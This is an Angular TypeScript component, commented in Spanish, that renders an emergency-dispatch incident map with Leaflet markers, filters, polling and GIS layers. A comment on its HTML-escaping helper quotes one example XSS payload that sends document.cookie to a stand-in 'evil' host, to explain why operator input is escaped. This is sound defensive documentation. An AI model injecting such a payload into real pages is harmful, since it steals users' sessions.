import {
  Component,
  ChangeDetectionStrategy,
  OnInit,
  OnDestroy,
  AfterViewInit,
  NgZone,
  inject,
  signal
} from '@angular/core';
import { CommonModule } from '@angular/common';
// Antes esto era `declare const L: any` y Leaflet llegaba por un <script> del
// CDN en index.html. La CSP de la plantilla es script-src 'self', así que ese
// script no cargaría: ahora se importa el paquete y además tipa de verdad.
import * as L from 'leaflet';

/**
 * Marcador de Leaflet con los datos del incidente colgados encima. Se guardan
 * ahí a propósito: el refresco periódico compara la prioridad para no recrear
 * el ícono en cada ciclo, y el click necesita el incidente sin volver a
 * buscarlo en la lista.
 */
interface MarcadorIncidente extends L.Marker {
  _incidente?: DtoMapaIncidente;
  _prioridad?: string;
}
import { FormsModule } from '@angular/forms';
import { Subject, interval, merge } from 'rxjs';
import { takeUntil, switchMap, startWith, filter } from 'rxjs/operators';
import { Router } from '@angular/router';
import { AuthService } from '../../../../core/auth/auth.service';
import { ToastService } from '../../../../core/services/toast.service';
import { MapaService, DtoMapaIncidente } from '../../../../core/services/operacion/mapa.service';
import { EventoService, DtoCanalItem } from '../../../../core/services/operacion/evento.service';

// Leaflet loaded via CDN in index.html


/** Color del marcador según prioridad del incidente. */
type PrioridadColor = '#cc0000' | '#e67300' | '#0066cc' | '#555555';

@Component({
  selector: 'app-mapa-incidentes-page',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './mapa-incidentes-page.component.html',
  styleUrls: ['./mapa-incidentes-page.component.scss'],
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class MapaIncidentesPageComponent implements OnInit, AfterViewInit, OnDestroy {

  // ── Claims JWT ────────────────────────────────────────────────────────────
  sitioGraba = 0;
  codDane    = '';

  // ── Estado de la UI ───────────────────────────────────────────────────────
  readonly cargando      = signal(false);
  readonly errorCarga    = signal(false);
  readonly panelAbierto  = signal(false);
  /** true si la librería Leaflet no cargó (revisar index.html) — se muestra un mensaje en vez de un div vacío. */
  readonly mapaNoDisponible = signal(false);
  readonly incidenteSeleccionado = signal<DtoMapaIncidente | null>(null);

  // ── Búsqueda de dirección ─────────────────────────────────────────────────
  direccionBusqueda = '';

  // ── Filtros ───────────────────────────────────────────────────────────────
  filtroEstado    = '';  // '' = todos
  filtroPrioridad = '';  // '' = todos
  filtroTexto     = '';  // búsqueda por dirección / código caso
  filtroCanal     = 0;   // 0 = todos los canales (se envía al backend)
  /**
   * Fuerza propietaria del canal seleccionado. cad_canales.codigo no es único por sí
   * solo (cada fuerza numera sus canales desde 1) — sin esto, seleccionar un canal
   * puede traer también los incidentes del canal homónimo de otra fuerza.
   */
  filtroCanalFuerzaId = 0;

  // ── Canales disponibles para el filtro ────────────────────────────────────
  readonly canalesDisponibles = signal<DtoCanalItem[]>([]);

  // ── Datos ─────────────────────────────────────────────────────────────────
  readonly incidentes     = signal<DtoMapaIncidente[]>([]);
  readonly incidentesFiltrados = signal<DtoMapaIncidente[]>([]);

  // ── Estadísticas rápidas ──────────────────────────────────────────────────
  get totalActivos():   number { return this.incidentes().filter(i => i.estado === 'A').length; }
  get totalPendientes():number { return this.incidentes().filter(i => i.estado === 'P').length; }
  get totalEnProceso(): number { return this.incidentes().filter(i => ['E','T','R'].includes(i.estado)).length; }
  get totalFlash():     number { return this.incidentes().filter(i => this.esFlash(i.prioridad)).length; }

  // ── Mapa Leaflet ──────────────────────────────────────────────────────────
  private map:             any = null;
  private municipioLayer:  any = null;
  private cuadrantesLayer: any = null;
  private markers:         Map<string, MarcadorIncidente> = new Map();

  private readonly ARCGIS_BASE =
    'https://services3.arcgis.com/8cBoM4o6pnuUb1z1/ArcGIS/rest/services/SIDENCO_SinMalla/FeatureServer';

  private readonly REFRESH_INTERVAL_MS = 30_000; // 30 segundos

  private destroy$ = new Subject<void>();
  /** Dispara una recarga inmediata (cambio de filtro de canal) fuera del ciclo de polling. */
  private recargar$ = new Subject<void>();

  private readonly auth      = inject(AuthService);
  private readonly svc       = inject(MapaService);
  private readonly eventoSvc = inject(EventoService);
  private readonly toast     = inject(ToastService);
  private readonly zone      = inject(NgZone);
  private readonly router    = inject(Router);

  // ══════════════════════════════════════════════════════════════════════════
  //  Lifecycle
  // ══════════════════════════════════════════════════════════════════════════

  ngOnInit(): void {
    const claims    = this.auth.getJwtClaims();
    this.sitioGraba = claims.sitioGraba;
    this.codDane    = claims.codDane;
    this.cargarCanales();
  }

  private cargarCanales(): void {
    this.eventoSvc.getCanales(this.sitioGraba)
      .pipe(takeUntil(this.destroy$))
      .subscribe({
        next: data => {
          this.canalesDisponibles.set(data ?? []);
        },
        error: () => { /* no crítico — filtro de canal simplemente no aparece */ }
      });
  }

  ngAfterViewInit(): void {
    this.initMap();
    this.iniciarPolling();
    // Registrar callback global para botones dentro de popups de Leaflet
    (window as any)._secadMapaAbrirDetalle = (id: string) => {
      this.zone.run(() => {
        const inc = this.incidentes().find(i => i.id === id);
        if (inc) this.seleccionarIncidente(inc);
      });
    };
  }

  ngOnDestroy(): void {
    this.destroy$.next();
    this.destroy$.complete();
    // Limpiar callback global
    delete (window as any)._secadMapaAbrirDetalle;
    if (this.map) {
      this.map.off();
      this.map.remove();
      this.map = null;
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Mapa — Inicialización
  // ══════════════════════════════════════════════════════════════════════════

  private initMap(): void {
    if (typeof L === 'undefined') {
      console.warn('[Mapa] Leaflet no disponible. Verifique index.html.');
      this.mapaNoDisponible.set(true);
      return;
    }

    this.map = L.map('mapaIncidentesDiv', {
      zoomControl: true,
      attributionControl: true
    }).setView([4.7110, -74.0721], 12);

    // Capa base: OpenStreetMap
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '© <a href="https://openstreetmap.org">OpenStreetMap</a>',
      maxZoom: 19
    }).addTo(this.map);

    // Cargar capas institucionales si hay codDane
    if (this.codDane) {
      this.cargarCapaMunicipios(this.codDane);
    }

    // Invalidar tamaño al renderizar (evita mapa gris)
    setTimeout(() => this.map?.invalidateSize(), 200);
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Polling de datos
  // ══════════════════════════════════════════════════════════════════════════

  /**
   * Un único stream (poll cada 30s + recargas manuales por cambio de filtro) con
   * switchMap: cualquier recarga manual cancela automáticamente un poll en vuelo, y
   * viceversa — antes eran dos suscripciones independientes que podían pisarse (la
   * respuesta de un poll con el canal viejo llegaba después que la del cambio de
   * filtro y dejaba el mapa mostrando el canal incorrecto hasta el siguiente tick).
   * El poll periódico se pausa mientras la pestaña está oculta.
   */
  private iniciarPolling(): void {
    merge(interval(this.REFRESH_INTERVAL_MS), this.recargar$).pipe(
      filter(() => !document.hidden),
      startWith(0),
      switchMap(() => {
        this.cargando.set(true);
        return this.svc.getIncidentesActivos(this.sitioGraba, this.filtroCanal, this.filtroCanalFuerzaId);
      }),
      takeUntil(this.destroy$)
    ).subscribe({
      next: (data) => {
        this.zone.run(() => {
          this.cargando.set(false);
          this.errorCarga.set(false);
          this.incidentes.set(data);
          this.aplicarFiltros();
          this.sincronizarMarcadores(data);
        });
      },
      error: () => {
        this.zone.run(() => {
          this.cargando.set(false);
          this.errorCarga.set(true);
        });
      }
    });
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Marcadores en el mapa
  // ══════════════════════════════════════════════════════════════════════════

  private sincronizarMarcadores(incidentes: DtoMapaIncidente[]): void {
    if (!this.map) return;

    const idsActuales = new Set(incidentes.map(i => i.id));

    // Eliminar marcadores de incidentes que ya cerraron
    this.markers.forEach((marker, id) => {
      if (!idsActuales.has(id)) {
        this.map.removeLayer(marker);
        this.markers.delete(id);
      }
    });

    // Agregar o actualizar marcadores
    for (const inc of incidentes) {
      const lat = parseFloat(inc.latitudCaso);
      const lng = parseFloat(inc.longitudCaso);
      if (isNaN(lat) || isNaN(lng)) continue;

      // Un solo get(): has()+get() no estrecha el tipo y además busca dos veces.
      const existente = this.markers.get(inc.id);
      if (existente) {
        // Actualizar posición, popup e ícono si el marcador ya existe.
        // _incidente se reasigna en cada sync para que el handler de clic (que lo
        // lee en el momento del clic, no por closure) siempre vea el dato fresco
        // — antes el clic directo sobre el pin abría el panel con el snapshot del
        // momento en que se creó el marcador, aunque el popup ya mostrara datos
        // actualizados.
        const marker = existente;
        marker.setLatLng([lat, lng]);
        marker.setPopupContent(this.buildPopupContent(inc));
        // El color/etiqueta del pin codifica la prioridad — sin esto, un
        // incidente reclasificado (p. ej. de Rutina a Flash) conservaba el
        // ícono viejo indefinidamente mientras siguiera activo.
        if (marker._prioridad !== inc.prioridad) {
          marker.setIcon(this.crearIcono(inc.prioridad));
          marker._prioridad = inc.prioridad;
        }
        marker._incidente = inc;
      } else {
        // Crear nuevo marcador
        const icon   = this.crearIcono(inc.prioridad);
        const marker: MarcadorIncidente = L.marker([lat, lng], { icon })
          .bindPopup(this.buildPopupContent(inc), { maxWidth: 280, minWidth: 220 })
          .on('click', () => {
            this.zone.run(() => {
              // Se lee en el momento del clic (no por closure) para ver siempre
              // el dato fresco; el guard es por si el marcador quedó sin datos.
              if (marker._incidente) this.seleccionarIncidente(marker._incidente);
            });
          });
        marker._prioridad = inc.prioridad;
        marker._incidente = inc;
        marker.addTo(this.map);
        this.markers.set(inc.id, marker);
      }
    }
  }

  private crearIcono(prioridad: string): any {
    const color = this.colorPorPrioridad(prioridad);
    const label = this.labelPrioridadCorto(prioridad);

    return L.divIcon({
      className: '',
      html: `
        <div style="
          position: relative;
          width: 32px;
          height: 42px;
        ">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 42" width="32" height="42">
            <path d="M16 0 C7.163 0 0 7.163 0 16 C0 27 16 42 16 42 C16 42 32 27 32 16 C32 7.163 24.837 0 16 0 Z"
                  fill="${color}" stroke="rgba(0,0,0,0.4)" stroke-width="1.5"/>
            <circle cx="16" cy="16" r="9" fill="rgba(255,255,255,0.25)"/>
          </svg>
          <span style="
            position: absolute;
            top: 6px;
            left: 50%;
            transform: translateX(-50%);
            color: #fff;
            font-size: 8px;
            font-weight: 700;
            font-family: sans-serif;
            text-shadow: 0 1px 2px rgba(0,0,0,0.6);
            white-space: nowrap;
            line-height: 1;
          ">${label}</span>
        </div>`,
      iconSize:    [32, 42],
      iconAnchor:  [16, 42],
      popupAnchor: [0, -44]
    });
  }

  /**
   * Escapa HTML para interpolación segura en los popups de Leaflet.
   * bindPopup()/setPopupContent() asignan el string vía innerHTML — nunca pasa
   * por el sanitizador de Angular porque el DOM lo maneja Leaflet directamente,
   * no una plantilla con [innerHTML]. Todo campo de texto libre digitado por un
   * operador (dirección, descripción, barrio, usuario…) debe pasar por aquí
   * antes de interpolarse, o un valor como
   * `&lt;img src=x onerror="fetch('https://evil/steal?c='+document.cookie)"&gt;`
   * capturado en, por ejemplo, dire_caso se ejecutaría en la sesión de
   * cualquier despachador que abra el mapa.
   */
  private escapeHtml(value: string | null | undefined): string {
    if (!value) return '';
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  private buildPopupContent(inc: DtoMapaIncidente): string {
    const estadoBadge = this.estadoBadgeHtml(inc.estado);
    const actuaciones = inc.totalActuaciones > 0
      ? `<span style="color:#0a9242;font-weight:600">
           <i class="fa-solid fa-car-side"></i> ${inc.totalActuaciones} unidad(es)
         </span>`
      : `<span style="color:var(--ui-muted,#888)">Sin unidades asignadas</span>`;

    const codiPedido    = this.escapeHtml(inc.codiPedido);
    const descPedido    = this.escapeHtml(inc.descPedido) || 'Sin descripción';
    const codiPedido2   = this.escapeHtml(inc.codiPedido2);
    const descPedido2   = this.escapeHtml(inc.descPedido2);
    const direCaso      = this.escapeHtml(inc.direCaso) || '—';
    const barrio        = this.escapeHtml(inc.barrio);
    const horaCaso       = this.escapeHtml(inc.horaCaso);
    const usernameCreacion = this.escapeHtml(inc.usernameCreacion) || '—';
    // inc.id es un Snowflake numérico controlado por el backend, pero se valida
    // igual antes de interpolarlo dentro de un atributo onclick — defensa en
    // profundidad, no confiar en que el origen del dato nunca cambie.
    const idSeguro = /^[0-9]+$/.test(inc.id) ? inc.id : '';

    const desc2 = inc.codiPedido2
      ? `<div style="font-size:11px;color:var(--ui-muted,#666);margin-top:2px">
           ${codiPedido2} — ${descPedido2}
         </div>`
      : '';

    return `
      <div style="font-family:sans-serif;min-width:200px">
        <div style="font-weight:700;font-size:13px;margin-bottom:4px;color:var(--ui-text,#1a1a2e)">
          ${codiPedido} — ${descPedido}
        </div>
        ${desc2}
        <div style="font-size:11px;color:var(--ui-text,#444);margin:6px 0 2px">
          <i class="fa-solid fa-location-dot"></i>
          ${direCaso}
          ${barrio ? ` · ${barrio}` : ''}
        </div>
        <div style="font-size:11px;color:var(--ui-muted,#555);margin-bottom:6px">
          <i class="fa-regular fa-clock"></i> ${horaCaso}
          &nbsp;|&nbsp;
          <i class="fa-solid fa-user"></i> ${usernameCreacion}
        </div>
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
          ${estadoBadge}
          ${actuaciones}
        </div>
        <button
          onclick="window._secadMapaAbrirDetalle && window._secadMapaAbrirDetalle('${idSeguro}')"
          style="
            background:#003087;color:#fff;border:none;border-radius:4px;
            padding:4px 10px;font-size:11px;cursor:pointer;width:100%;margin-top:4px
          ">
          <i class='fa-solid fa-arrow-up-right-from-square'></i> Ver detalle
        </button>
      </div>`;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Capas GIS (ArcGIS REST → Leaflet GeoJSON)
  // ══════════════════════════════════════════════════════════════════════════

  private cargarCapaMunicipios(codDane: string): void {
    if (!codDane || !this.map) return;
    const url =
      `${this.ARCGIS_BASE}/3/query?` +
      `where=CODIGO='${encodeURIComponent(codDane)}'` +
      `&outFields=CODIGO,NOMBRE&returnGeometry=true&f=geojson`;

    fetch(url)
      .then(r => r.json())
      .then((geojson: any) => {
        if (!this.map) return;
        if (this.municipioLayer) this.map.removeLayer(this.municipioLayer);

        this.municipioLayer = L.geoJSON(geojson, {
          style: {
            color: '#ff0000', weight: 1.5,
            fillColor: '#7d7d7d', fillOpacity: 0.20
          }
        }).addTo(this.map);

        const bounds = this.municipioLayer.getBounds();
        if (bounds.isValid()) {
          this.map.fitBounds(bounds, { padding: [20, 20] });
          this.cargarCapaCuadrantesPorBbox(bounds);
        }
      })
      .catch(err => console.warn('[Mapa] Error cargando municipio:', err));
  }

  private cargarCapaCuadrantesPorBbox(bounds: any): void {
    if (!this.map) return;
    const sw   = bounds.getSouthWest();
    const ne   = bounds.getNorthEast();
    const bbox = `${sw.lng},${sw.lat},${ne.lng},${ne.lat}`;

    const url =
      `${this.ARCGIS_BASE}/11/query?` +
      `geometry=${encodeURIComponent(bbox)}` +
      `&geometryType=esriGeometryEnvelope` +
      `&spatialRel=esriSpatialRelIntersects` +
      `&outFields=*&returnGeometry=true&f=geojson` +
      `&resultRecordCount=2000`;

    fetch(url)
      .then(r => r.json())
      .then((geojson: any) => {
        if (!this.map) return;
        if (this.cuadrantesLayer) this.map.removeLayer(this.cuadrantesLayer);
        this.cuadrantesLayer = L.geoJSON(geojson, {
          style: {
            color: '#ff0000', weight: 1.5,
            fillOpacity: 0, opacity: 0.55
          }
        }).addTo(this.map);
      })
      .catch(err => console.warn('[Mapa] Error cargando cuadrantes:', err));
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Búsqueda de dirección (Nominatim forward geocode)
  // ══════════════════════════════════════════════════════════════════════════

  geocodificarDireccion(): void {
    const q = this.direccionBusqueda.trim();
    if (!q) return;

    const url = `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(q)}&format=json&limit=1`;
    fetch(url)
      .then(r => r.json())
      .then((data: any[]) => {
        if (!data?.length) {
          this.toast.warning('Mapa', 'Dirección no encontrada');
          return;
        }
        const lat = parseFloat(data[0].lat);
        const lon = parseFloat(data[0].lon);
        this.zone.run(() => {
          this.map?.setView([lat, lon], 17);
        });
      })
      .catch(() => this.toast.error('Mapa', 'Error al geocodificar'));
  }

  onBusquedaKeyup(event: KeyboardEvent): void {
    if (event.key === 'Enter') this.geocodificarDireccion();
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Filtros
  // ══════════════════════════════════════════════════════════════════════════

  aplicarFiltros(): void {
    let lista = this.incidentes();

    if (this.filtroEstado) {
      if (this.filtroEstado === 'EP') {
        lista = lista.filter(i => ['E','T','R'].includes(i.estado));
      } else {
        lista = lista.filter(i => i.estado === this.filtroEstado);
      }
    }

    if (this.filtroPrioridad) {
      lista = lista.filter(i => this.normalizarPrioridad(i.prioridad) === this.filtroPrioridad);
    }

    if (this.filtroTexto.trim()) {
      const txt = this.filtroTexto.trim().toLowerCase();
      lista = lista.filter(i =>
        (i.direCaso  || '').toLowerCase().includes(txt) ||
        (i.codiPedido|| '').toLowerCase().includes(txt) ||
        (i.descPedido|| '').toLowerCase().includes(txt) ||
        (i.ciudad    || '').toLowerCase().includes(txt)
      );
    }

    this.incidentesFiltrados.set(lista);

    // Actualizar visibilidad de marcadores
    if (this.map) {
      const idsVisibles = new Set(lista.map(i => i.id));
      this.markers.forEach((marker, id) => {
        if (idsVisibles.has(id)) {
          if (!this.map.hasLayer(marker)) marker.addTo(this.map);
        } else {
          if (this.map.hasLayer(marker)) this.map.removeLayer(marker);
        }
      });
    }
  }

  /**
   * Clave compuesta código::fuerza para el <select> de canal. cad_canales.codigo
   * NO es único por sí solo (cada fuerza numera sus canales desde 1) — usar solo
   * el código para identificar la opción seleccionada confundiría canales de
   * fuerzas distintas que comparten el mismo código.
   */
  canalKey(codigo: number, fuerzaId: number): string {
    return `${codigo}::${fuerzaId}`;
  }

  /** Cambia el filtro de canal (clave compuesta) y re-consulta el backend inmediatamente. */
  onCanalKeyChange(key: string): void {
    const [codigo, fuerzaId] = key.split('::').map(Number);
    this.filtroCanal          = codigo   || 0;
    this.filtroCanalFuerzaId  = fuerzaId || 0;
    this.recargar$.next();
  }

  limpiarFiltros(): void {
    this.filtroEstado        = '';
    this.filtroPrioridad     = '';
    this.filtroTexto         = '';
    this.filtroCanal         = 0;
    this.filtroCanalFuerzaId = 0;
    this.recargar$.next();
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Selección de incidente
  // ══════════════════════════════════════════════════════════════════════════

  seleccionarIncidente(inc: DtoMapaIncidente): void {
    this.incidenteSeleccionado.set(inc);
    this.panelAbierto.set(true);

    // Centrar mapa en el incidente seleccionado
    const lat = parseFloat(inc.latitudCaso);
    const lng = parseFloat(inc.longitudCaso);
    if (!isNaN(lat) && !isNaN(lng) && this.map) {
      this.map.setView([lat, lng], 16);
      this.markers.get(inc.id)?.openPopup();
    }
  }

  cerrarPanel(): void {
    this.panelAbierto.set(false);
    this.incidenteSeleccionado.set(null);
  }

  /** Navega al módulo de Pedido con el ID del incidente seleccionado. */
  irAPedido(id: string): void {
    this.router.navigate(['/operacion/pedido'], { queryParams: { id } });
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  Helpers de UI
  // ══════════════════════════════════════════════════════════════════════════

  colorPorPrioridad(prioridad: string): PrioridadColor {
    const p = this.normalizarPrioridad(prioridad);
    if (p === 'FLASH')    return '#cc0000';
    if (p === 'INMEDIATA') return '#e67300';
    if (p === 'RUTINA')   return '#0066cc';
    return '#555555';
  }

  labelPrioridadCorto(prioridad: string): string {
    const p = this.normalizarPrioridad(prioridad);
    if (p === 'FLASH')    return 'FLH';
    if (p === 'INMEDIATA') return 'INM';
    return 'RUT';
  }

  normalizarPrioridad(prioridad: string): string {
    const map: Record<string, string> = {
      '01': 'FLASH', 'FLASH': 'FLASH',
      '02': 'INMEDIATA', 'INMEDIATA': 'INMEDIATA',
      '03': 'RUTINA',    'RUTINA': 'RUTINA'
    };
    return map[(prioridad || '').toUpperCase()] ?? 'RUTINA';
  }

  labelPrioridad(prioridad: string): string {
    const p = this.normalizarPrioridad(prioridad);
    if (p === 'FLASH')    return 'Flash';
    if (p === 'INMEDIATA') return 'Inmediata';
    return 'Rutina';
  }

  esFlash(prioridad: string): boolean {
    return this.normalizarPrioridad(prioridad) === 'FLASH';
  }

  labelEstado(estado: string): string {
    const map: Record<string, string> = {
      A: 'Activo', P: 'Pendiente', E: 'En proceso',
      T: 'Seguimiento', R: 'Revisión', C: 'Cerrado', V: 'Anulado'
    };
    return map[estado ?? ''] ?? estado;
  }

  claseEstado(estado: string): string {
    const map: Record<string, string> = {
      A: 'badge-activo', P: 'badge-pendiente',
      E: 'badge-proceso', T: 'badge-seguimiento',
      R: 'badge-revision', C: 'badge-cerrado'
    };
    return map[estado ?? ''] ?? 'badge-default';
  }

  estadoBadgeHtml(estado: string): string {
    const label = this.labelEstado(estado);
    const cls   = this.claseEstado(estado);
    const colors: Record<string, string> = {
      'badge-activo':      'background:#d4edda;color:#155724',
      'badge-pendiente':   'background:#fff3cd;color:#856404',
      'badge-proceso':     'background:#cce5ff;color:#004085',
      'badge-seguimiento': 'background:#e2d9f3;color:#6f42c1',
      'badge-revision':    'background:#f8d7da;color:#721c24',
      'badge-cerrado':     'background:#d6d8db;color:#383d41'
    };
    const style = colors[cls] ?? 'background:#eee;color:#333';
    return `<span style="${style};padding:2px 7px;border-radius:10px;font-size:10px;font-weight:600">${label}</span>`;
  }

  labelOrigen(origen: string): string {
    const map: Record<string, string> = {
      PLANTATEL:  'Llamada PlantaTel',
      RECEPCION:  'Recepción',
      APP_MOVIL:  'App Móvil',
      INTEGRACION:'Integración',
      INTERNO:    'Radio/Campo',
      MANUAL:     'Manual',
      SIEDCO:     'SIEDCO'
    };
    return map[origen ?? ''] ?? origen;
  }
}
